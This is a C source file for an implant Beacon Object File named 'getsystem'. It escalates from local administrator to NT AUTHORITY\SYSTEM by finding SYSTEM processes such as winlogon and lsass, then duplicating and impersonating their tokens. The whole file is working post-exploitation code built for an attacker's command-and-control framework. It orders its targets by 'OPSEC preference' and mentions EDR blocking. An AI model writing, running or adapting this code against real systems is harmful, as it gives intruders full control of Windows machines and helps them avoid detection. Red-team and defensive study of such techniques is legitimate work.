/*
 * getsystem.c — Elevate to NT AUTHORITY\SYSTEM
 *
 * Single technique: Token duplication from a SYSTEM process.
 * Opens a SYSTEM process (winlogon, services, lsass, etc.),
 * duplicates its token, and impersonates it.
 *
 * NO threads, NO pipes, NO services, NO child processes.
 * Cannot hang or block. Every API call is synchronous and fast.
 *
 * Requires: LOCAL ADMIN (HIGH integrity)
 *
 * SYSTEM identity check uses direct SID byte comparison against
 * the well-known S-1-5-18 SID — no LookupAccountSidW, no network calls.
 */
#include <windows.h>
#include "beacon_compat.h"

/* ── kernel32 ── */
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentProcess(void);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentThread(void);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT int    WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH, LPBOOL);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);

/* ── advapi32 ── */
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$OpenThreadToken(HANDLE, DWORD, BOOL, PHANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$DuplicateTokenEx(HANDLE, DWORD, PVOID, DWORD, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$ImpersonateLoggedOnUser(HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$GetTokenInformation(HANDLE, DWORD, LPVOID, DWORD, PDWORD);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$RevertToSelf(void);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$LookupAccountSidW(LPCWSTR, PSID, LPWSTR, LPDWORD, LPWSTR, LPDWORD, PDWORD);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$EqualSid(PSID, PSID);

/* ── ntdll ── */
DECLSPEC_IMPORT DWORD NTAPI NTDLL$NtQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);

/* ── msvcrt ── */
DECLSPEC_IMPORT int __cdecl MSVCRT$_wcsicmp(const wchar_t*, const wchar_t*);

/* ── Constants ── */
#ifndef PROCESS_QUERY_INFORMATION
#define PROCESS_QUERY_INFORMATION   0x0400
#endif
#ifndef TOKEN_ALL_ACCESS
#define TOKEN_ALL_ACCESS            0x000F01FF
#endif
#ifndef TOKEN_QUERY
#define TOKEN_QUERY                 0x0008
#endif
#ifndef TOKEN_DUPLICATE
#define TOKEN_DUPLICATE             0x0002
#endif
#ifndef TOKEN_IMPERSONATE
#define TOKEN_IMPERSONATE           0x0004
#endif
#ifndef MEM_COMMIT
#define MEM_COMMIT                  0x1000
#endif
#ifndef MEM_RESERVE
#define MEM_RESERVE                 0x2000
#endif
#ifndef MEM_RELEASE
#define MEM_RELEASE                 0x8000
#endif
#ifndef PAGE_READWRITE
#define PAGE_READWRITE              0x04
#endif

#define MY_SecurityDelegation       3
#define MY_TokenImpersonation       2
#define MY_TokenUser                1
#define MY_TokenIntegrityLevel      25
#define SystemProcessInformation    5

/*
 * Well-known SYSTEM SID: S-1-5-18
 * Binary: 01 01 00 00 00 00 00 05 12 00 00 00
 *   Revision=1, SubAuthorityCount=1, Authority={0,0,0,0,0,5}, SubAuth[0]=18 (0x12)
 */
static const BYTE SYSTEM_SID[] = {
    0x01, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x05,
    0x12, 0x00, 0x00, 0x00
};

/*
 * Check if a token belongs to NT AUTHORITY\SYSTEM by comparing
 * the token's user SID against the well-known S-1-5-18 SID.
 * No network calls — pure memory comparison.
 */
static BOOL is_system_token(HANDLE hToken) {
    BYTE buf[256];
    DWORD needed = 0;

    if (!ADVAPI32$GetTokenInformation(hToken, MY_TokenUser, buf, sizeof(buf), &needed))
        return FALSE;

    /* TOKEN_USER starts with SID_AND_ATTRIBUTES: first field is PSID */
    PSID pSid = *(PSID*)buf;

    return ADVAPI32$EqualSid(pSid, (PSID)SYSTEM_SID);
}

/*
 * Get display name for verification output.
 * Uses LookupAccountSidW but ONLY called once after successful
 * impersonation — never in a loop, never for SYSTEM check.
 */
static void get_token_username(HANDLE hToken, char *out, int outLen) {
    BYTE buf[256];
    DWORD needed = 0;
    out[0] = 0;

    if (!ADVAPI32$GetTokenInformation(hToken, MY_TokenUser, buf, sizeof(buf), &needed))
        return;

    PSID pSid = *(PSID*)buf;
    wchar_t name[128] = {0}, domain[128] = {0};
    DWORD nameLen = 128, domLen = 128, sidUse = 0;

    if (ADVAPI32$LookupAccountSidW(NULL, pSid, name, &nameLen, domain, &domLen, &sidUse)) {
        char aName[128], aDomain[128];
        KERNEL32$WideCharToMultiByte(CP_UTF8, 0, name, -1, aName, 128, NULL, NULL);
        KERNEL32$WideCharToMultiByte(CP_UTF8, 0, domain, -1, aDomain, 128, NULL, NULL);
        int pos = 0;
        for (int i = 0; aDomain[i] && pos < outLen - 2; i++) out[pos++] = aDomain[i];
        out[pos++] = '\\';
        for (int i = 0; aName[i] && pos < outLen - 1; i++) out[pos++] = aName[i];
        out[pos] = 0;
    }
}

void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);
    /* int technique = */ BeaconDataInt(&parser); /* ignored — only one technique now */

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] GetSystem — token duplication from SYSTEM process\n");

    /* Target processes in OPSEC preference order */
    const wchar_t *targets[] = {
        L"winlogon.exe",
        L"services.exe",
        L"spoolsv.exe",
        L"svchost.exe",
        L"lsass.exe",
        NULL
    };

    /* Enumerate all processes via NtQuerySystemInformation */
    ULONG bufSize = 1024 * 1024;
    PVOID buffer = KERNEL32$VirtualAlloc(NULL, bufSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buffer) {
        BeaconPrintf(CALLBACK_ERROR, "[!] VirtualAlloc failed\n");
        return;
    }

    ULONG retLen = 0;
    DWORD status;
    while ((status = NTDLL$NtQuerySystemInformation(
            SystemProcessInformation, buffer, bufSize, &retLen)) == 0xC0000004) {
        KERNEL32$VirtualFree(buffer, 0, MEM_RELEASE);
        bufSize = retLen + 4096;
        buffer = KERNEL32$VirtualAlloc(NULL, bufSize,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buffer) {
            BeaconPrintf(CALLBACK_ERROR, "[!] VirtualAlloc failed on retry\n");
            return;
        }
    }

    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] NtQuerySystemInformation failed: 0x%08x\n", status);
        KERNEL32$VirtualFree(buffer, 0, MEM_RELEASE);
        return;
    }

    BOOL success = FALSE;

    /* For each target process name (in OPSEC order), scan all PIDs */
    for (int t = 0; targets[t] && !success; t++) {
        BYTE *current = (BYTE*)buffer;

        while (1) {
            DWORD nextOffset = *(DWORD*)(current + 0x00);
            DWORD pid        = (DWORD)(*(ULONG_PTR*)(current + 0x48));

            /* Read UNICODE_STRING at offset 0x38 */
            USHORT nameLen   = *(USHORT*)(current + 0x38);
            wchar_t *nameBuf = *(wchar_t**)(current + 0x38 + sizeof(ULONG_PTR));

            if (pid > 4 && nameLen > 0 && nameBuf) {
                /* Build null-terminated copy of process name */
                wchar_t procName[128];
                int copyLen = nameLen / 2;
                if (copyLen > 127) copyLen = 127;
                for (int i = 0; i < copyLen; i++)
                    procName[i] = nameBuf[i];
                procName[copyLen] = 0;

                if (MSVCRT$_wcsicmp(procName, targets[t]) == 0) {
                    /* Found a matching process — try to dup its token */
                    HANDLE hProc = KERNEL32$OpenProcess(
                        PROCESS_QUERY_INFORMATION, FALSE, pid);
                    if (!hProc) goto next_entry;

                    HANDLE hToken = NULL;
                    if (!ADVAPI32$OpenProcessToken(hProc,
                            TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
                            &hToken)) {
                        KERNEL32$CloseHandle(hProc);
                        goto next_entry;
                    }

                    /* Check if this is actually SYSTEM (SID comparison, no network) */
                    if (!is_system_token(hToken)) {
                        KERNEL32$CloseHandle(hToken);
                        KERNEL32$CloseHandle(hProc);
                        goto next_entry;
                    }

                    /* Duplicate as impersonation token */
                    HANDLE hDup = NULL;
                    if (!ADVAPI32$DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS,
                            NULL, MY_SecurityDelegation, MY_TokenImpersonation,
                            &hDup)) {
                        BeaconPrintf(CALLBACK_ERROR,
                            "[!] DuplicateTokenEx on PID %u failed: %u\n",
                            pid, KERNEL32$GetLastError());
                        KERNEL32$CloseHandle(hToken);
                        KERNEL32$CloseHandle(hProc);
                        goto next_entry;
                    }

                    /* Impersonate */
                    if (!ADVAPI32$ImpersonateLoggedOnUser(hDup)) {
                        BeaconPrintf(CALLBACK_ERROR,
                            "[!] ImpersonateLoggedOnUser failed: %u\n",
                            KERNEL32$GetLastError());
                        KERNEL32$CloseHandle(hDup);
                        KERNEL32$CloseHandle(hToken);
                        KERNEL32$CloseHandle(hProc);
                        goto next_entry;
                    }

                    /* Success — log which process we used */
                    char aProc[128] = {0};
                    KERNEL32$WideCharToMultiByte(CP_UTF8, 0,
                        procName, -1, aProc, 128, NULL, NULL);
                    BeaconPrintf(CALLBACK_OUTPUT,
                        "[+] Duplicated SYSTEM token from %s (PID %u)\n",
                        aProc, pid);

                    success = TRUE;
                    /* Don't close hDup — impersonation holds a ref */
                    KERNEL32$CloseHandle(hToken);
                    KERNEL32$CloseHandle(hProc);
                    break;
                }
            }
next_entry:
            if (nextOffset == 0) break;
            current += nextOffset;
        }
    }

    KERNEL32$VirtualFree(buffer, 0, MEM_RELEASE);

    if (success) {
        /* Verify by reading the thread token */
        HANDLE hThreadToken = NULL;
        if (ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(),
                TOKEN_QUERY, FALSE, &hThreadToken)) {
            char user[256] = {0};
            get_token_username(hThreadToken, user, sizeof(user));
            BeaconPrintf(CALLBACK_OUTPUT,
                "[+] Thread token: %s\n"
                "[+] SUCCESS — elevated to NT AUTHORITY\\SYSTEM\n"
                "[*] Use 'tokenmanip --action revert' to drop impersonation\n",
                user);
            KERNEL32$CloseHandle(hThreadToken);
        } else {
            BeaconPrintf(CALLBACK_ERROR,
                "[!] Impersonation call succeeded but no thread token set (err: %u)\n",
                KERNEL32$GetLastError());
            ADVAPI32$RevertToSelf();
        }
    } else {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] Failed — could not duplicate a SYSTEM token\n"
            "[*] Possible reasons:\n"
            "    - Not running as local admin (need HIGH integrity)\n"
            "    - All SYSTEM processes denied token access\n"
            "    - EDR blocked OpenProcess/OpenProcessToken\n");
    }
}
